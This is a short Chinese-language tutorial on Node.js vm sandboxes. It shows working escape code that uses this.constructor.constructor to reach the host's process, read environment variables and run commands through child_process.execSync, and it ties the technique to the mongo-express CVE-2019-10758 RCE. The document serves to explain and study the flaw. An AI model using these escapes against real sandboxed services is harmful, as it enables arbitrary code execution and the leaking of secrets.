## 什么是沙箱

```
node官方文档里提到node的vm模块可以用来做沙箱环境执行代码，对代码的上下文环境做隔离
A common use case is to run the code isn a sandboxed environment. 
The sandboxed code uses a different V8 Context, meaning that it has a different global object than the rest of the code.
```

关于vm的学习:http://www.alloyteam.com/2015/04/xiang-jie-nodejs-di-vm-mo-kuai/

vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序。但是可以通过构造语句来进行逃逸：

逃逸例子：

```
const vm = require("vm");
const env = vm.runInNewContext(`this.constructor.constructor('return this.process.env')()`);
console.log(env);
```

执行之后可以获取到主程序环境中的环境变量

上面例子的代码等价于如下代码：

```
const vm = require('vm');
const sandbox = {};
const script = new vm.Script("this.constructor.constructor('return this.process.env')()");
const context = vm.createContext(sandbox);
env = script.runInContext(context);
console.log(env);
```

创建vm环境时，首先要初始化一个对象 sandbox，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。

因为`this.constructor.constructor`返回的是一个`Function constructor`，所以可以利用Function对象构造一个函数并执行。(此时Function对象的上下文环境是处于主程序中的) 这里构造的函数内的语句是`return this.process.env`，结果是返回了主程序的环境变量。

配合`chile_process.exec()`就可以执行任意命令了：

```
const vm = require("vm");
const env = vm.runInNewContext(`const process = this.constructor.constructor('return this.process')();
process.mainModule.require('child_process').execSync('whoami').toString()`);
console.log(env);
```

最近的mongo-express RCE(CVE-2019-10758)漏洞就是配合vm沙箱逃逸来利用的。

具体分析可参考：[CVE-2019-10758:mongo-expressRCE复现分析](https://xz.aliyun.com/t/7056)